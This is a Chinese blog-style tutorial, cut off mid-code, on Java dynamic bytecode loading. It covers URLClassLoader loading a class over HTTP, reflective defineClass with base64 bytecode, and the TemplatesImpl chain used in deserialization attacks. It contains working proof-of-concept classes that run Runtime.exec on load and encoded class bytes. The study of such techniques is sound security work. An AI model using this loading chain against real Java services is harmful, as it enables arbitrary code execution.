    <content type="html"><![CDATA[<h1 id="Java动态加载字节码"><a href="#Java动态加载字节码" class="headerlink" title="Java动态加载字节码"></a>Java动态加载字节码</h1><p>接着学Java了，前段时间挖了挖洞，过段时间再来写写经历和体会吧，接下来我们来看看Java中动态加载字节码的方法，可以远程加载服务器上的字节码，或者本地的字节码就行</p><span id="more"></span><h2 id="Java字节码是啥"><a href="#Java字节码是啥" class="headerlink" title="Java字节码是啥"></a>Java字节码是啥</h2><p>简单点儿说，Java字节码就是<code>.class</code>后缀的文件，里面存放的是Java虚拟机执行使用的一类指令；因为Java也是一门编译型的语言，所以说我们在运行之前需要先编译一遍，编译过后就会形成<code>.class</code>文件，就可以运行在不同平台的JVM虚拟机中了；其实不只是Java语言，像什么<code>Scala</code>、<code>Kotlin</code>这样的语言编写的代码，只要能编译成<code>.class</code>文件，都可以在JVM虚拟机中运行了</p><p>所以说字节码就是所有能被<strong>恢复成一个类</strong>，并且<strong>能在JVM虚拟机中加载的字节序列</strong>，都在我们的探讨范围内，这里偷张p神的图：</p><p><img src="https://s2.loli.net/2022/02/27/pd4lmPN6IcTWf2a.png" alt="image.png"></p><h2 id="URLClassLoader加载远程class文件"><a href="#URLClassLoader加载远程class文件" class="headerlink" title="URLClassLoader加载远程class文件"></a>URLClassLoader加载远程class文件</h2><p><code>ClassLoader</code>是一个加载器，就是用来告诉JVM虚拟机如何去加载这个类，默认的就是根据类名来加载类，这个类名需要是完整路径，比如说<code>java.lang.Runtime</code>；而这里我们提到的<code>URLClassLoader</code>，是默认加载器<code>AppClassLoader</code>的父类，所以说这个的工作过程实际上就是在介绍默认的Java类加载器的工作流程</p><p>首先，java会根据基础路径去寻找<code>class</code>文件来加载，而这个基础路径有三种情况：</p><ul><li>URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader来寻找类，即为在Jar包中寻找.class文件</li><li>URL以斜杠 / 结尾，且协议名是 file，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</li><li>URL以斜杠 / 结尾，且协议名不是file ，则使用最基础的Loader来寻找类</li></ul><p>所以说咱可以以斜杠<code>/</code>结尾，但又不用file协议，而是使用http协议，这样就可以用<code>Loader</code>来寻找类了</p><p>那我们来试试http协议，看能不能从远程http服务器上加载<code>.class</code>文件，首先我们得先编译出一个class文件，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">eviltest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">eviltest</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的一个命令执行的代码，只要它新建了<code>eviltest</code>对象，访问了构造方法，它就能弹出计算器，接下来就用<code>javac</code>编译一下，然后将<code>.class</code>文件随便找个目录放着，然后在那个目录用<code>python</code>快速创建一个http服务器：<code>python3 -m http.server</code></p><p><img src="https://s2.loli.net/2022/02/27/ny7LpITNVvglSaH.png" alt="image.png"></p><p>然后就来写远程加载这个字节码的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UrlLoaderTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> URL(<span class="string">&quot;http://localhost:8000/&quot;</span>)&#125;;</span><br><span class="line">        URLClassLoader loader = URLClassLoader.newInstance(urls);</span><br><span class="line">        Class c = loader.loadClass(<span class="string">&quot;eviltest&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后那个<code>newInstance</code>相当于就是一个创建对象，那么自然就会调用默认的无参构造方法，运行它：</p><p><img src="https://s2.loli.net/2022/02/27/Hwm7XprNDEtV6As.png" alt="image.png"></p><p>很完美，弹出计算器，而且日志上也有体现</p><h2 id="ClassLoader-defineClass直接加载字节码"><a href="#ClassLoader-defineClass直接加载字节码" class="headerlink" title="ClassLoader#defineClass直接加载字节码"></a>ClassLoader#defineClass直接加载字节码</h2><p>上面我们看到了利用<code>URLClassLoader</code>加载远程字节码，其实也就是<code>Java</code>中默认加载字节码的方法；接下来我们来看看<code>Java</code>加载字节码的方法的调用，无论是远程<code>class</code>文件，或者说本地的<code>class</code>或者<code>jar</code>文件，都是这样调用的</p><p>首先是调用<code>ClassLoader</code>类中的<code>loadClass</code>方法，这个方法的作用是从已经加载的类缓存、父加载器等位置去寻找类，在没有找到类的情况下，就会交给<code>ClassLoader</code>类的<code>findClass</code>方法；然后<code>findClass</code>方法就是根据基础路径的方式，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后将字节码交给<code>ClassLoader</code>类的<code>defineClass</code>，<code>defineClass</code>的作用就是处理前面传入的字节码，将其处理为真正的Java类；<code>ClassLoader#loadClass  -&gt;  ClassLoader#findClass  -&gt;  ClassLoader#defineClass</code></p><p>所以说真正的核心就是<code>defineClass</code>，它决定了怎么将一段字节流变成Java类，这个逻辑挺复杂的，在JVM中的C语言代码中，这儿就不深究了，直接看看它是咋个加载的就行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloDefineClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAHAoABgAPCgAQABEIABIKABAAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAWAQAKU291cmNlRmlsZQEADWV2aWx0ZXN0LmphdmEMAAcACAcAFwwAGAAZAQAIY2FsYy5leGUMABoAGwEACGV2aWx0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAABAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAAgAEAAMADQAEAAsAAAAEAAEADAABAA0AAAACAA4=&quot;</span>);</span><br><span class="line">        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;eviltest&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为<code>defineClass</code>这个方法是受保护的，所以说我们必须通过暴力反射来获取到它，然后这个字节码就是我们前面远程调用的那一段字节码经过了base64加密过后的，然后就是依然创建对象，在对象创建的时候调用无参构造方法，执行命令：</p><p><img src="https://s2.loli.net/2022/02/27/Kq5TesWxAGnuYCX.png" alt="image.png"></p><h2 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h2><p>前面我们介绍了<code>defineClass</code>，但因为<code>defineClass</code>方法作用域不开放，所以说很难直接利用它，而且大部分上层开发者也不会直接使用到，但是有一些Java底层的类用到了它，而它就是非常经典的<code>TemplatesImpl</code>，在反序列化中这个类是很重要的</p><p>在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类中定义了一个内部类<code>TransletClassLoader</code>，而在这个类中重写了<code>defineClass</code>方法，而且这个方法并没有显式地声明定义域，也就是说它是一种默认的类型，也就是<code>default</code>类型的，而默认类型的是可以被类外部调用的，这就挺好，有了更大的利用空间了，看看它的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line">    TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; ret = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">        <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ret = <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="function">Class <span class="title">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为<code>TransletClassLoader</code>是内部类，所以说只允许<code>TemplatesImpl</code>类中的方法调用，那我们就往上看看，有没有方法调用了它，是有的，它就是<code>TemplatesImpl</code>类中的<code>defineTransletClasses()</code>方法，但它是一个<code>private</code>方法，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);<span class="comment">//在这里调用了defineClass</span></span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于它是<code>private</code>方法，所以说不能直接调用，再往上走，看看哪个函数调用了<code>defineTransletClasses()</code>方法，它就是<code>getTransletInstance</code>方法，源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();<span class="comment">//此处调用defineTransletClasses方法</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary class to prevent the GC from collecting them</span></span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet)</span><br><span class="line">                    _class[_transletIndex].getConstructor().newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">            translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException | IllegalAccessException |</span><br><span class="line">                NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>也是<code>private</code>方法，得再往上看，找到了<code>newTransformer()</code>方法，这里就是<code>public</code>方法了，可以直接调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);<span class="comment">//调用了getTransletInstance方法</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样一条完整的利用链就下来了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>也就是说只要我们执行<code>newTransformer()</code>方法就能触发利用链了</p><p>然后我们还得设置<code>TemplatesImpl</code>对象的三个私有属性，这里我们用反射设置就行，三个属性：<code> _bytecodes</code> 、<code> _name</code> 和 <code>_tfactory</code> ， <code>_bytecodes</code> 是由字节码组成的数组； <code>_name</code> 可以是任意字符串，只要不为 null 即可； <code>_tfactory</code> 需要是一个<code>TransformerFactoryImpl</code> 对象，因为<code>TemplatesImpl#defineTransletClasses()</code> 方法里有调用到 <code>_tfactory.getExternalExtensionsMap()</code> ，如果是null会出错。</p><p>但是，<code>TemplatesImpl</code>中对加载的字节码还有一定的要求，这个字节码对应的类必须要是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类，所以我们还得构造一个特殊的类，用这个类生成字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span></span><br><span class="line"><span class="params"><span class="function">                          SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        String[] command = &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;;</span><br><span class="line">        Runtime.getRuntime().exec(command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这个类得到字节码之后，我们就来写POC，就新建一个<code>TemplatesImpl</code>对象，把属性设置进去然后执行<code>newTransformer</code>方法触发，主要是咱得先写一个利用反射给私有属性赋值的一个方法<code>setFieldValue</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">defineclass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span 